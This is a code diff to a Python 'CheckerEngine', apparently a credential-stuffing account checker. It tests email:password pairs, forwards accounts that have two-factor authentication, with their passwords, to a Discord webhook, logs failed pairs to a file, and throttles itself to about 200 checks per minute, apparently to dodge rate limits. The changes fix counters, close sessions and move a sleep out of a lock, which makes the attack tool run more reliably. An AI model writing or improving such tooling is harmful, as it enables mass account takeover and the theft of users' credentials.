@@ -468,7 +468,9 @@ class CheckerEngine:
                     discord_notifier.send_2fa_webhook(email, password, self.config)
                     with self.lock:
                         self.twofa += 1
+                        self.checked += 1
                     self.db.update_stats(self.user_id, errors=1)
+                    session.close()
                     return
                 if token:
                     break
@@ -486,7 +488,12 @@ class CheckerEngine:
             self.write_dedupe(self.results_dir, 'bad.txt', f'{email}:{password}\n')
             with self.lock:
                 self.bad += 1
+                self.checked += 1
             self.db.update_stats(self.user_id, bad=1)
+            try:
+                session.close()
+            except Exception:
+                pass
             return
 
         try:
@@ -693,14 +700,16 @@ class CheckerEngine:
 
     def _rate_limit_wait(self):
         """Enforce rate limiting to keep CPM around target (~200)."""
+        wait_time = 0
         with self._rate_lock:
             now = time.time()
             min_gap = self._per_thread_delay / max(self.threads, 1)
             elapsed_since_last = now - self._last_check_time
             if elapsed_since_last < min_gap:
                 wait_time = min_gap - elapsed_since_last
-                time.sleep(wait_time)
             self._last_check_time = time.time()
+        if wait_time > 0:
+            time.sleep(wait_time)
 
     def run_worker(self) -> None:
         while self.is_running:
